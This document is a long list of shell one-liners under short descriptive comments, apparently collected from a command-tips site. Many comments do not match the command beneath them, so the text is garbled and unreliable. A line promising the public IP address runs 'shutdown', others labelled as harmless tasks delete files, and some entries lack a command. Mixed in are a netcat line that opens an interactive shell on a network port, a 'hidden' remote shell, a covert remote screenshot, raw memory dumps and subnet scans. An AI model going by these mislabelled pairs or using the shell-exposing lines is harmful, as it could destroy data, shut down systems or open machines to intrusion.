file /bin/* | msort -j -l -n-1 -n2 2> /dev/null
# Enable cd by variable names
shopt -s cdable_vars
# Geolocate a given IP address
curl ipinfo.io/<ipaddress>
# Find the processes that are on the runqueue.  Processes with a status of
ps -eo stat,pid,user,command | egrep "^STAT|^D|^R"
# Edit file(s) that has been just listed
vi `!!`
# camelcase to underscore
echo thisIsATest | sed -E 's/([A-Z])/_\L\1/g'
# grep (or anything else) many files with multiprocessor power
find . -type f -print0 | xargs -0 -P 4 -n 40 grep -i foobar
# Perform a reverse DNS lookup
dig -x 74.125.45.100
# Using the urxvt terminal daemon
urxvtd -q -o -f
# Create a continuous digital clock in Linux terminal
watch -t -n 1 date +%T
# Access folder "-"
cd -- -
# Show all machines on the network
nmap 192.168.0-1.0-255 -sP
# Simulate typing
pactl set-sink-mute 0 toggle
# Display GCC Predefined Macros
gcc -dM -E - <<<''
# Download and extract a *tar.gz file with curl.
bash -x script.sh 2> log
# YES = NO
yes n
# get a random 0/1, use it for on/off, yes/no
echo $[RANDOM % 2]
# en/decrypts files in a specific directory
for a in path/* ; do ccenrypt -K <password> $a; done
# Copy via tar pipe while preserving file permissions (cp does not!; run this command with root!)
cp -pr olddirectory newdirectory
# Monitoring wifi connection by watch command (refresh every 3s), displaying iw dump info and iwconfig on wireless interface "wlan0"
watch -d -n 3 "iw dev wlan0 station dump; iwconfig wlan0"
# Generate diff of first 500 lines of two files
diff <(head -500 product-feed.xml) <(head -500 product-feed.xml.old)
# Number of CPU's in a system
grep "processor" /proc/cpuinfo | wc -l
# Get an IP address out of fail2ban jail
iptables -D fail2ban-SSH -s <ip_address_to_be_set_free> -j DROP
# find all non-html files
find . -type f ! -name "*html"
# Print a date from 3 days ago
TZ=PST8PDT+72 date '+%Y_%m_%d'
# Get mouse location (X,Y coordinates)
xdotool getmouselocation
# print file without duplicated lines usind awk
awk '!($0 in a) {a[$0];print}' file
# Boot another OS at next startup
echo "savedefault --default=2 --once" | grub --batch; sudo reboot
# Change display resolution
ssh USER@REMOTESYSTEM arecord - | aplay -
# a for loop with filling 0 format, with seq
for i in `seq -f %03g 5 50 111`; do echo $i ; done
# Print a row of characters the width of terminal
printf -vl "%${COLUMNS:-`tput cols 2>&-||echo 80`}s\n" && echo ${l// /-};
# Identify name and resolution of all jpgs in current directory
identify  -verbose *.jpg|grep "\(Image:\|Resolution\)"
# Format ps command output
ps ax -o "%p %U %u %x %c %n"
# Start another instance of X via SSH
rm -d **/*(/^F)
# Get your internal IP address and nothing but your internal IP address
ifconfig $devices | grep "inet addr" | sed 's/.*inet addr:\([0-9\.]*\).*/\1/g'
# Tail a log-file over the network
(echo -e "HTTP/1.1 200 Ok\n\r"; tail -f /var/log/syslog) | nc -l 1234
# Show latest changed files
ls -ltcrh
# Get all ip address for the host
hostname -I
# Command line calculator
awk "BEGIN{ print $* }"
# Print out a man page
man -t man | lp
# monitor network traffic and throughput in real time
iptraf
# List files with full path
find $(pwd) -maxdepth 1
# Skip filenames with control characters, a.k.a tab,newline etc
find . ! -name "$(printf '*[\001-\037\177]*')"
# View non-printing characters with cat
cat -v -t -e
# Find writable files
find -writable
# Sort the size usage of a directory tree by gigabytes, kilobytes, megabytes, then bytes.
dh() { du -ch --max-depth=1 "${@-.}"|sort -h }
# Find files containing string and open in vim
vim $(grep test *)
# Convert encoding of given files from one encoding to another
iconv -f utf8 -t utf16 /path/to/file
# show all established tcp connections on os x
lsof -iTCP -sTCP:ESTABLISHED | awk '{print $1}' | sort -u
# Setup a persistant SSH tunnel w/ pre-shared key authentication
diff <(tree /dir/one) <(tree /dir/two)
# Create multiple subfolders in one command.
mkdir -p /path/{folder1,folder2,folder3,folder4}
# view the system memory in clear text
hexdump -e '90/1 "%_p" "\n"' /dev/mem | less
# Count to 65535 in binary (for no apparent reason)
a=`printf "%*s" 16`;b=${a//?/{0..1\}}; echo `eval "echo $b"`
# cd up a number of levels
function ..(){ for ((j=${1:-1},i=0;i<j;i++));do builtin cd ..;done;}
# Remove the first character of each line in a file
sed "s/^.//g" files
# Calculating series with awk: add numbers from 1 to 100
seq 100 | awk '{sum+=$1} END {print sum}'
# zsh only: access a file when you don't know the path, if it is in PATH
file =top
# Use GNU info with a pager
info --subnodes -o - <item> | less
# Getting the last argument from the previous command
cd !$
# delete files containing matching text
grep -r -Z -l "<text>" . | xargs -0 echo rm
# vimdiff to remotehost
vimdiff tera.py <(ssh -A testserver "cat tera.py")
# Find the biggest files
du -sk * | sort -rn | head
# Delete Last Line of a File if it is Blank
sed '${/^$/d}' file
# Unzip multiple files with one command
unzip '*.zip'
# Watch memcache traffic
sudo tcpdump -i eth0 -s 65535 -A -ttt port 11211
# Find files with root setuids settings
sudo find / -user root -perm -4000 -print
# Mac Sleep Timer
find /tmp -type f -printf 'rm "%p";\n'
# Tweak system files without invoking a root shell
echo "Whatever you need" | sudo tee [-a] /etc/system-file.cfg
# no more line wrapping in your terminal
function nowrap { export COLS=`tput cols` ; cut -c-$COLS ; unset COLS ; }
# Use the arguments used in the last command
mkdir !*
# Create and replay macros in vim
<esc> q a ...vim commands... <esc> q (to record macro) @a (plays macro 'a').
# Monitor memory usage
watch vmstat -sSM
# Get your external IP address if your machine has a DNS entry
dig +short $HOSTNAME
# ssh: change directory while connecting
ssh -t server 'cd /etc && $SHELL'
# convert from decimal to hexadecimal
hex() { bc <<< "obase=16; $1"; }
# split a string (1)
ARRAY=(aa bb cc);echo ${ARRAY[1]}
# Stage only portions of the changes to a file.
git add --patch <filename>
# List your MACs address
cat /sys/class/net/*/address
# move cursor to beginning of command line
Ctrl+a
# Unixtime
date +%s
# video thumbnail gallery
totem-video-thumbnailer -pg 25 in_video out_png
# Eliminate dead symlinks interactively in /usr/ recursevely
find /usr/ -type l ! -xtype f ! -xtype d -ok rm -f {} \;
# switch case of a text file
tr a-zA-Z A-Za-z < input.txt
# find largest file in /var
find /var -mount -ls -xdev | /usr/bin/sort -nr +6 | more
# Determine if a command is in your $PATH using POSIX
command -v bash
# Picture Renamer
jhead -n%Y%m%d-%H%M%S *.jpg
# An alarm clock using xmms2 and at
at 6:00 <<< "xmms2 play"
# Write comments to your history.
comment() { echo "" > /dev/null; }
# Adding formatting to an xml document for easier reading
xmllint --format <filename> > <output file>
# Happy Days
echo {1..3}" o'clock" ROCK
# Bash: escape '-' character in filename
mv -- -filename filename
# Which processes are listening on a specific port (e.g. port 80)
lsof -iTCP:80 -sTCP:LISTEN
# Your name backwards
echo "$USER"|rev | espeak
# Short one line while loop that outputs parameterized content from one file to another
awk '{print $1}' < three-column.txt > first-column.txt
# Find top 10 largest files in /var directory (subdirectories and hidden files included )
tree -isafF /var|grep -v "/$"|tr '[]' ' '|sort -k1nr|head
# Create user add lines from partial passwd file
awk -F: '{print "useradd -u "$3,"-c \""$5"\"","-s "$7,$1}' passwd
# Remove orphaned dependencies on Arch
find . -empty -type f -delete
# Mount directories in different locations
mount --bind /old/directory/path /new/directory/path
# Resize a Terminal Window
printf "\e[8;70;180;t"
# Do command when logged in from certain ips using ssh
if [ "${SSH_CLIENT%% *}" == "ipaddr" ]; then command; fi
# Short one line while loop that outputs parameterized content from one file to another
cut -f 1 three-column.txt > first-column.txt
# check open ports (both ipv4 and ipv6)
lsof -Pn | grep LISTEN
# give a binary the ability to open ports below 1024 as non root user
sudo setcap CAP_NET_BIND_SERVICE=+eip /usr/bin/python2.7
# Find a file's package or list a package's contents.
dlocate [ package | string ]
# Play random music from blip.fm
diff -Naur --strip-trailing-cr
# Quick directory bookmarks
to() { eval dir=\$$1; cd "$dir"; }
# List all process running a specfic port
sudo lsof -i :<port>
# Mount a partition from within a complete disk dump
lomount -diskimage /path/to/your/backup.img -partition 1 /mnt/foo
# netcat as a portscanner
nc -v -n -z -w 1 127.0.0.1 22-1000
# List all authors of a particular git project
git shortlog -s | cut -c8-
# Let's make screen and ssh-agent friends
eval `ssh-agent`; screen
# Customize time format of 'ls -l'
ls -l --time-style=+"%Y-%m-%d %H:%M:%S"
# Create subdirectory and move files into it
(ls; mkdir subdir; echo subdir) | xargs mv
# Learn the difference between single and double quotes
a=7; echo $a; echo "$a"; echo '$a'; echo "'$a'"; echo '"$a"'
# Generate a binary file with all ones (0xff) in it
tr '\000' '\377' < /dev/zero | dd of=allones bs=1024 count=2k
# list all file extensions in a directory
ls -Xp | grep -Eo "\.[^/]+$" | sort | uniq
# Limit the cpu usage of a process
prlimit --cpu=10 sort -u hugefile
# Display screen window number in prompt
[[ "$WINDOW" ]] && PS1="\u@\h:\w[$WINDOW]\$ "
# Every Nth line position # (AWK)
awk 'NR%3==1' file
# Remove all HTML tags from a file
awk '{gsub("<[^>]*>", "")}1' file
# Simple XML tag extract with sed
sed -n 's/.*<foo>\([^<]*\)<\/foo>.*/\1/p'
# bulk rename files with sed, one-liner
ls * | sed -e 'p;s/foo/bar/' | xargs -n2 mv
# Notify me when users log in
du -sk ./* | sort -nr
# Add "prefix" on a buch of files
for a in *; do mv $a prefix${a}; done
# diff two sorted files
diff <(sort file1.txt) <(sort file2.txt)
# Using json.tool from the shell to validate and pretty-print
echo '{"json":"obj"}' | python -mjson.tool
# determine if tcp port is open
nmap -p 80 hostname
# Dump sqlite database to plain text format
echo '.dump' | sqlite3 your_sqlite.db > your_sqlite_text.txt
# Suppress output of loud commands you don't want to hear from
quietly() { "$@" |&:; }
# Get a list of ssh servers on the local subnet
nmap -p 22 --open -sV 192.168.2.0/24
# Console clock
yes "echo -ne '\r'\`date\`;sleep 1" | sh
# kill some pids without specific pid
shuf SOMEFILE
# Calculate sum of N numbers (Thanks to flatcap)
seq -s "+" 3 | bc
# Load another file in vim
:split <file>
# Find top 10 largest files in /var directory (subdirectories and hidden files included )
tree -ihafF /var | tr '[]' ' '| sort -k1hr|head -10
# combine `mkdir foo && cd foo`  into a single function `mcd foo`
function mcd() {   [ -n "$1" ] && mkdir -p "$@" && cd "$1";   }
# Randomize lines in a file
sort -R SOMEFILE
# Remove comments and empty lines from a conf file
grep ^[^#] /etc/file.conf
# Terminal - Prints out, what the users name, notifyed in the gecos field, is
getent passwd $(whoami) | cut -f 5 -d: | cut -f 1 -d,
# How to run a command on a list of remote servers read from a file
dsh -M -c -f servers -- "command HERE"
# Slow down the screen output of a command
ls -lart|lolcat -a
# Ensure that each machine that you log in to has its own history file
export HISTFILE="$HOME/.bash_history-$(hostname -s)"
# extract element of xml
xml2 < file.xml | grep ^/path/to/element | cut -f2- -d=
# Get absolut path to your bash-script
PATH=$(cd ${0%/*}; pwd)
# Run a command as root, with a delay
sudo bash -c "sleep 1h ; command"
# Broadcast your shell thru port 5000
bash -i 2>&1 | tee /dev/stderr | nc -l 5000
# get you public ip address
shutdown -h 240 & disown
# Propagate a directory to another and create symlink to content
lndir sourcedir destdir
# Check motherboard manufacturer, product name, version and serial number
upto() { cd "${PWD/\/$@\/*//$@}" }
# get ip of all running docker containers
docker inspect --format "{{ .NetworkSettings.IPAddress }}" $(docker ps -q)
# Determine whether a CPU has 64 bit capability or not
if cat /proc/cpuinfo | grep " lm " &> /dev/null; then echo "Got 64bit" ; fi
# Tail a log-file over the network
tail -f error_log | nc -l 1234
# List files by quoting or escaping special characters.
ls --quoting-style={escape,shell,c}
# Count down from 10
for (( i = 10; i > 0; i-- )); do echo "$i"; sleep 1; done
# bash shell expansion
cp /really/long/path/and/file/name{,-`date -I`}
# Convert PNG to GIF
for file in *.png; do convert "$file" "$(basename $file .png).gif"; done
# Find broken symlinks in the current directory and its subdirectories.
find -L -type l
# Move all comments the top of the file in vim
:g:^\s*#.*:m0
# What is My WAN IP?
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
# Printable random characters
tr -dc '[:print:]' < /dev/urandom
# Show apps that use internet connection at the moment.
netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq
# Download all music files off of a website using wget
awk '/regex/{print x};{x=$0}'
# update you web
~ ctrl-z
# bash-quine
s='s=\47%s\47; printf "$s" "$s"'; printf "$s" "$s"
# bash script to zip a folder while ignoring git files and copying it to dropbox
screen -xR
# Join the content of a bash array with commas
(IFS=,; echo "${array[*]}")
# Generate White Noise
cat /dev/urandom > /dev/dsp
# Console clock
watch -n1 'date "+%T"'
# list all opened ports on host
nmap -p 1-65535 --open localhost
# list and sort files by size in reverse order (file size in human readable output)
ls -S -lhr
# convert a line to a space
cat file | tr '\n' ''
# Quickly display a string as Qr Code
qr(){ qrencode ${1} -o - | xview stdin; }
# vim multiple files at one time, split vertically.
vim -O file1 file2
# Send a local file via email
mpack -s "Backup: $file" "$file" email@id.com
# ping MAC ADDRESS
cpp /usr/include/stdio.h | grep -v '^#' | grep -v '^$' | less
# Output Detailed Process Tree for any User
psu(){ command ps -Hcl -F S f -u ${1:-$USER}; }
# bash pause command
read -p "Press enter to continue.."
# Displays process tree of all running processes
pstree -Gap
# For finding out if something is listening on a port and if so what the daemon is.
fuser -n tcp {0..65535}
# Multiple variable assignments from command output in BASH
eval $(date +"day=%d; month=%m; year=%y")
# Add strikethrough to text
echo text | sed $"s/./&\xCC\xB6/g"
# Substitute spaces in filename with underscore
ls -1 | rename 's/\ /_/'
# Create a 5 MB blank file
dd if=/dev/zero of=testfile bs=1024 count=5000
# Get the 10 biggest files/folders for the current direcotry
du -sh * | sort -rh | head
# commit message generator - whatthecommit.com
watch -n1 snmptable -v2c -c public localhost diskIOTable
# Easily decode unix-time (funtion)
utime { date -d @$1; }
# vim's pastetoggle: when you press f9 'paste' is on , press f9 again and 'paste' is off, and so forth (works in insert-mode and command-mode)
:set pt=<f9>
# Run a bash script in debug mode, show output and save it on a file
bash -x test.sh 2>&1 | tee out.test
# List the size (in human readable form) of all sub folders from the current location
du -sch ./*
# Display HTTP-header using curl
curl -I g.cn
# Copy sparse files
cp --sparse=always <SRC> <DST>
# The proper way to read kernel messages in realtime.
dmesg -wx
# Get information on your graphics card on linux (such as graphics memory size)
for I in `/sbin/lspci |awk '/VGA/{print $1}'`;do /sbin/lspci -v -s $I;done
# distribution specific information
lsb_release -a
# Lists all files and directories with modified time newer than a given date
touch -t "YYYYMMDDhhmm.ss" ~/.ts ; find . -newer ~/.ts
# Resize A Mounted EXT3 File System
v=/dev/vg0/lv0; lvextend -L+200G $v && resize2fs $v
# Print current running shell, PID
ps -p $$
# total text files in current dir
file -i * | grep -c 'text/plain'
# Default value or argument
num_lines=${1:-42}
# Count number of Line for all the files in a directory recursively
for file in `find . -type f`; do cat $file; done | wc -l
# How to know the total number of packages available
apt-cache stats
# Turn shell tracing and verbosity (set -xv) on/off with 1 command!
xv() { case $- in *[xv]*) set +xv;; *) set -xv ;; esac }
# cd into another dir to run a one-liner, but implicitly drop back to your $OLD_PWD after
( cd $DIR; command; )
# killall -r ".*my-process.*"
Kill all process using regular expression (-r option)
# Find the 10 users that take up the most disk space
du -sm /home/* | sort -nr | head -n 10
# Grabs a random image from "~/wallpapers" and sets as the background
cd ~/wallpapers; feh --bg-fill "$( ls | sort -R | head -n 1 )"
# gh or "grep history" - define a function gh combining history and grep to save typing
function gh () { history | grep $* ; }  # gh or "grep history"
# Show all available cows
for i in /usr/share/cowsay/cows/*.cow; do cowsay -f $i "$i"; done
# Hex math with bc
echo 'obase=16; C+F' | bc
# write the output of a command to /var/log/user.log... each line will contain $USER, making this easy to grep for.
log() { (echo "\$ $@";$@) | logger -t $USER; }
# shows the full path of shell commands
which command
# Resume an emerge, and keep all object files that are already built
FEATURES=keepwork emerge --resume
# list files with last modified at the end
alias lrt='ls -lart'
# ISO info
isoinfo -d -i filename.iso
# Find files and calculate size of result in shell
echo $(($(find . -name "pattern" -type f -printf "+%s")))
# Pulls total current memory usage, including SWAP being used, by all active processes.
ps aux | awk '{sum+=$6} END {print sum/1024}'
# Ext3 format Terabytes in Seconds
mkfs.ext3 -T largefile4
# Tar - Compress by excluding folders
alias info='info --vi-keys'
# Title Case Files
rename 's/\b((?!(a|of|that|to)\b)[a-z]+)/\u$1/g' *
# Find common groups between two users
groups user1 user2|cut -d: -f2|xargs -n1|sort|uniq -d
# Show directories in the PATH, one per line
( IFS=:; for p in $PATH; do echo $p; done )
# Combining text files into one file
cat *.txt >output.txt
# Show the 20 most CPU/Memory hungry processes
ps aux | sort +2n | tail -20
# Show the UUID of a filesystem or partition
sudo vol_id -u /dev/sda1
# grep across a git repo and open matching files in gedit
git grep -l "your grep string" | xargs gedit
# Deleting / Ignoring lines from the top of a file
tail -n +2 foo.txt
# useless load
cat /dev/urandom | gzip -9 > /dev/null &
# Remote screenshot
DISPLAY=":0.0"; export DISPLAY; import -window root gotya.png
# Get gzip compressed web page using wget.
wget  -q -O- --header\="Accept-Encoding: gzip" <url> | gunzip > out.html
# Current running process ordered by %CPU
ps -eo pcpu,pid,args | sort -n
# Install Linux Kernel Headers
sudo apt-get install linux-headers-$(uname -r)
# Coping files, excluding certain files
find ./ ! -name 'excludepattern' | xargs -i cp --parents {} destdir
# display a smiling smiley if the command succeeded and a sad smiley if the command failed
<commmand>; if [[ "$?" = 0 ]]; then echo ':)'; else echo ':('; fi
# xargs for builtin bash commands
xargsb() { while read -r cmd; do ${@//'{}'/$cmd}; done; }
# Creates a symbolic link or overwrites an existing one
ln -nvfs /source /destination
# Provide the ten largest subfolders in the current folder
du -hsx * | sort -rh | head -10
# Get the version of sshd on a remote system
ssh -vN hostname 2>&1 | grep "remote software version"
# which process is accessing the CDROM
lsof -n | grep /media/cdrom
# kills rapidly spawning processes that spawn faster than you can repeat the killall command
alias a=" killall rapidly_spawning_process"; a; a; a;
# View acceptable client certificate CA names asked for during SSL renegotiations
openssl s_client -connect www.example.com:443 -prexit
# Script Terminal Session
script -f /tmp/foo; tail -f /tmp/foo
# Prints new content of files
tail -f file1 (file2 .. fileN)
# Find all files currently open in Vim and/or gVim
vim -r 2>&1 | grep '\.sw.' -A 5 | grep 'still running' -B 5
# Watch contents of a file grow
tail -n 0 -f /var/log/messages
# List available upgrades from apt without upgrading the system
apt-get --just-print upgrade
# Extract title from HTML files
sed -n 's/.*<title>\(.*\)<\/title>.*/\1/ip;T;q' file.html
# Test load balancers
curl --resolve subdomain.example.com:80:10.100.0.1 subdomain.example.com -I -s
# Remove  \r (carriage return) in a file
sed -i 's/\r//g somefile.txt
# Command to keep an SSH connection open
watch -n 30 uptime
# date offset calculations
date --date="1 fortnight ago"
# Extract all 7zip files in current directory taking filename spaces into account
for file in *.7z; do 7zr e "$file"; done
# Measure, explain and minimize a computer's electrical power consumption
sudo powertop
# Listing today’s files only
find directory_path -maxdepth 1 -daystart -mtime -1
# Randomize lines (opposite of | sort)
random -f <file>
# Start a SOCKS proxy to avoid a restrictive firewall
echo data | nc -q 0 host 5000
# Open a manpage in the default (graphical) web browser
alias bman='man --html=x-www-browser'
# Run the last command as root
su -c "!!"
# Display list of available printers
lpstat -p
# route output as next command's parameters
<cmd> | xargs -0 <cmd>
# Runs previous command replacing foo by bar every time that foo appears
^foo^bar^:&
# "hidden" remote shell
ssh -T user@host /bin/bash -i
# Delete all non-printing characters from a file
tr -dc '[:print:]' < <file>
# Print number of mb of free ram
free -m | awk '/Mem/ {print $4}'
# grep -v with multiple patterns.
sed '/test/{/error\|critical\|warning/d}' somefile
# easily find megabyte eating files or directories
du -hs *|grep M|sort -n
# Check reverse DNS
host {checkIp or hostname} [dns server]
# Print number of mb of free ram
free -m | awk '/buffer/ {print $4}'
# creeate file named after actual date
touch file-$(date +%Y%m%d)
# limit the cdrom driver to a specified speed
eject -x 8 /dev/cdrom
# Create backup copy of file, adding suffix of the date of the file modification (NOT today's date)
cp file file.$(date -d @$(stat -c '%Y' file) "+%y%m%d")
# Sorted list of established destination connections
netstat | awk '/EST/{print $5}' | sort
# List the size of all sub folders and files from the current location, with sorting
du -a --max-depth=1 | sort -n
# Adding Prefix to File name
rename 's/^/PREFIX/g' *
# Command to logout all the users in one command
who -u | grep -vE "^root " | kill `awk '{print $7}'`
# A nice command for summarising repeated information
alias counts=sort | uniq -c | sort -nr
# Start screen with name and run command
screen -dmS "name_me" echo "hi"
# gpg encrypt a file
gpg --encrypt --recipient 'Foo Bar' foo.txt
# Joins args together using the first arg as glue
joinargs() { (IFS="$1"; shift && echo "$*") }
# Monitor Linux/MD RAID Rebuild
watch -n 5 -d cat /proc/mdstat
# Use ImageMagick to get an image's properties
identify -ping imageName.png
# Bingo-like raffle
for i in $(seq 1 100 | sort -R); do echo $i; sleep 5; done
# Do some learning...
whatis /usr/bin/* 2> /dev/null | less
# Safe Russian Roulette (only echo, don't delete files)
[ $[ $RANDOM % 6 ] == 0 ] && echo 'Bang!' || echo 'Click...'
# Youtube-dl gone stale on you/stopped working (Ubuntu)?
sudo youtube-dl -U
# files and directories in the last 1 hour
find ./* -ctime -1 | xargs ls -ltr --color
# Printing multiple years with Unix cal command
for y in $(seq 2009 2011); do cal $y; done
# When was your OS installed?
ls -ldct /lost+found |awk '{print $6, $7}'
# rsync over ssh via non-default ssh port
rsync -e 'ssh -p PORT' user@host:SRC DEST
# floating point operations in shell scripts
echo "scale=4; 3 / 5" | bc
# Rename file to same name plus datestamp of last modification.
mv -iv $FILENAME{,.$(stat -c %y $FILENAME | awk '{print $1}')}
# List known debian vulnerabilities on your system -- many of which may not yet be patched.
blacklist usb_storage >> /etc/modprobe.d/blacklist.conf
# Remove CR LF from a text file
tr -d '\r\n' < input_file.txt > output_file.txt
# list files in mtime order
ls -lt | more
# resume other user's screen session via su, without pty error
# su - <user> ; script /dev/null ; screen -r
# View Owner, Group & Permissions.
stat -c '%n %U:%G-%a' *
# "Pretty print" $PATH, show directories in $PATH, one per line with replacement pattern using shell parameter expansion
echo -e ${PATH//:/\\n}
# Remove all hidden files in a directory
rm -r .??*
# Converts uppercase chars in a string to lowercase
echo StrinG | tr '[:upper:]' '[:lower:]'
# shell bash iterate number range with for loop
for i in {1..10}; do echo $i; done
# Simple server which listens on a port and prints out received data
ncat -l portnumber
# Find files modified since a specific date
find /path/to/somewhere -newermt "Jan 1"
# kde4 lock screen command
qdbus org.freedesktop.ScreenSaver /ScreenSaver Lock
# Run TOP in Color, split 4 ways for x seconds - the ultimate ps command. Great for init scripts
G=$(stty -g);stty rows $((${LINES:-50}/2));top -n1; stty $G;unset G
# untar undo
tar tfz filename.tgz |xargs rm -Rf
# Random number generation within a range N, here N=10
echo $(( $RANDOM % 10 + 1 ))
# Disable WoL on eth0
sudo ethtool -s eth0 wol d
# Colorize make, gcc, and diff output
colormake, colorgcc, colordiff
# Undo commit in Mercurial
hg diff -c $REV --reverse | hg patch --no-commit -
# Two command output
netstat -n | grep ESTAB |grep  :80  | tee /dev/stderr | wc -l
# List all groups and the user names that were in each group
for u in `cut -f1 -d: /etc/passwd`; do echo -n $u:; groups $u; done | sort
# Show account security settings
chage -l <user>
# Get full directory path of a script regardless of where it is run from
BASEDIR=$(dirname $(readlink -f $0))
# Find out the last times your system was rebooted (for the duration of wtmp).
last reboot
# Put split files back together, without a for loop
cat file{0..5} > mainfile
# Check your bash shell for vulnerability to the ShellShock exploit
x="() { :; }; echo x" bash -c :
# find read write traffic on disk since startup
iostat -m -d /dev/sda1
# commandline dictionary
wn wonder -over
# If (and only if) the variable is not set, prompt users and give them a default option already filled in.
[ -n "$REMOTE_USER" ] || read -p "Remote User: " -er -i "$LOGNAME" REMOTE_USER
# Execute a sudo command remotely, without displaying the password
stty -echo; ssh -t HOSTNAME "sudo some_command"; stty echo
# Go to the Nth line of file
sed -n 13p /etc/services
# Get creation date of a file on ext2-3-4 fs
debugfs -R  "stat <$(stat --printf=%i filename)>" /dev/sdaX | grep crtime
# Git Tree Command with color and tag/branch name
git log --graph --oneline --all --decorate --color
# Mount Fat USB with RWX
sudo mount -t vfat -o umask=000,uid=YOUR_UID,gid=users /dev/sdb1 /media/usb
# Quick and dirty RSS
curl --silent "FEED ADDRESS" |sed -e 's/<\/[^>]*>/\n/g' -e 's/<[^>]*>//g
# Docker.io Stop and Remove all processes
docker stop $(docker ps -a -q); docker rm $(docker ps -a -q)
# Prefix every line with a timestamp
any command | while read line; do echo "[`date -Iseconds`] $line"; done
# Create patch file for two directories
diff -r -u originDir updateDir > result.patch
# Query an NFS host for its list of exports
/usr/sbin/showmount -e <host>
# Apply new patch for a directory (originDir)
patch -p0 -i result.patch
# Create a 100MB file for testing transfer speed
dd if=/dev/random of=bigfile bs=1024 count=102400
# run command on a group of nodes in parallel
seq 1 5 | parallel ssh {}.cluster.net uptime
# Generate a random password
openssl rand -base64 12
# access to last touched or created file with arrow_up_key immediately after displaying  the file list
lsa() { ls -lart; history -s "joe \"$(\ls -apt|grep -v /|head -1)\""  ; }
# Verbosely delete files matching specific name pattern, older than 15 days.
rm -vf /backup/directory/**/FILENAME_*(m+15)
# backup directory. (for bash)
cp -pr directory-you-want-to-backup{,_`date +%Y%m%d`} # for bash
# Batch rename extension of all files in a folder, in the example from .txt to .md
for f in *.txt;do mv ${f%txt}{txt,md}; done
# Download files linked in a RSS feed
curl $1 | grep -E "http.*\.mp3" | sed "s/.*\(http.*\.mp3\).*/\1/" | xargs wget
# Quick notepad
cat > list -
# strips the first field of each line where the delimiter is the first ascii character
cut -f2 -d`echo -e '\x01'` file
# To convert **.wav to **.mp3 using LAME running one process per CPU core run:
parallel -j+0 lame {} -o {.}.mp3 ::: *.wav
# What is my ip?
wget -q -O - ifconfig.co
# Generate SSH public key from the private key
ssh-keygen -y -f privatekey.pem > publickey.pem
# Finding the number of cpu's
grep -c -e '^cpu[0-9]\+' /proc/stat
# Find out current working directory of a process
eval ls -l /proc/{$(pgrep -d, COMMAND)}/cwd
# Show the disk usage for files pointed by symbolic link in a directory
find /usr/lib -maxdepth 1 -type l -print0  | xargs -r0 du -Lh
# Delete recursively only empty folders on present dir
find ./ -empty -type d -delete
# Compare two directory trees.
diff <(cd dir1 && find . | sort) <(cd dir2 && find . | sort)
# List only the directories
ls -l | egrep ^d
# BASH: Print shell variable into AWK
MyVAR=85 awk '{ print ENVIRON["MyVAR"] }'
# Job Control
^z; bg; disown
# Processes by CPU usage
top -b -n 1 | sed 1,6d
# Quickest way to sort/display # of occurences
"some line input" | sort | uniq -c | sort -nr
# Getting ESP and EIP addresses from running processes
ps ax --format=pid,eip,esp,user,command
# Generate random password
randpw(){ < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;}
# What is my public IP-address?
wget -qO- ifconfig.me/ip
# Add thousand separator with sed, in a file or within pipe
sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta' filename
# Execute a command at a given time
at midnight<<<'ls -l'
# The Chronic: run a command every N seconds in the background
chronic () { t=$1; shift; while true; do $@; sleep $t; done & }
# Get all mac address
ifconfig -a| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
# system beep off
setterm -blength 0
# Create backup copy of file, adding suffix of the date of the file modification (NOT today's date)
cp file{,.$(date -r file "+%y%m%d")}
# Make a dedicated folder for each zip file
for f in *.zip; do unzip -d "${f%*.zip}" "$f"; done
# Mirror the NASA Astronomy Picture of the Day Archive
sed G file.txt
# Make less act like cat if its input's contents can fit on one screen
less -XF
# generate a telephone keypad
printf "%s\t%s\t%s\n" {1..9} '*' 0 '#'
# List the size (in human readable form) of all sub folders from the current location
du --max-depth=1|sort -n|cut -f2|tr '\n' '\0'|xargs -0 du -sh 2>/dev/null
# Create package dependency graph
apt-cache dotty PKG-NAME | dot -Tpng | display
# Show what a given user has open using lsof
lsof -u www-data
# Get the IP address of a machine. Just the IP, no junk.
/sbin/ifconfig -a | awk '/(cast)/ { print $2 }' | cut -d':' -f2 | head -1
# Show a Package Version on Debian based distribution
apt-cache show pkgname | grep -i "version:"
# Graphical tree of sub-directories with files
find . -print | sed -e 's;[^/]*/;|-- ;g;s;-- |;   |;g'
# Counts number of lines
find . \( -name '*.h' -o -name '*.cc' \) | xargs grep . | wc -l
# Top 10 Memory Processes
ps aux | sort -rk 4,4 | head -n 10
# Return threads count of a process
ps -o thcount -p <process id>
# Set file access control lists
setfacl -m u:john:r-- myfile
# Display rows and columns of random numbers with awk
seq 6 | awk '{for(x=1; x<=5; x++) {printf ("%f ", rand())}; printf ("\n")}'
# Sort lines using the Xth characted as the start of the sort string
sort -k1.x
# check python syntax in vim
:!pylint -e %
# cat ~/.ssh/id_rsa.pub | ssh user@site.com "cat - >> ~/.ssh/authorized_keys"
concatenate local RSA to remote machine's authorized_keys
# Donwload media from *.rm from an url of type htttp://.../*.ram
wget <URL> -O- | wget -i -
# Print text string vertically, one character per line.
echo "vertical text" | fold -1
# Remove newlines from output
cat filename | grep .
# Produce a pseudo random password with given length in base 64
date +%s | sha256sum | base64 | head -c <length>; echo
# Backup a file with a date-time stamp
buf () { cp $1{,$(date +%Y%m%d_%H%M%S)}; }
# extract email adresses from some file (or any other pattern)
grep -Eio '([[:alnum:]_.]+@[[:alnum:]_]+?\.[[:alpha:].]{2,6})' file.html
# Figure out what shell you're running
ps -p $$
# Kill all processes belonging to a user
ps -ef | grep $USERNAME | awk {'print $2'} | xargs kill [-9]
# shortcut to scp a file to the same location on a remote machine
scp filename root@remote:`pwd`
# Compare a remote file with a local file
diff <(ssh user@host cat /path/to/remotefile) /path/to/localfile
# easily convert one unit to another
units "2048 bytes" "kibibytes"
# display ip address
echo -e ''$_{1..80}'\b+'
# Make a directory named with the current date
mkdir `date --iso`
# whois surfing my web ?
watch lsof -i :80
# Find wich ports you probably want to open in your firewall on a fresh installed machine
lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u
# Router discovery
grep -P '\t' filename
# Convert one file from ISO-8859-1 to UTF-8.
iconv --from-code=ISO-8859-1 --to-code=UTF-8 iso.txt > utf.txt
# ls only directories
ls -ad */
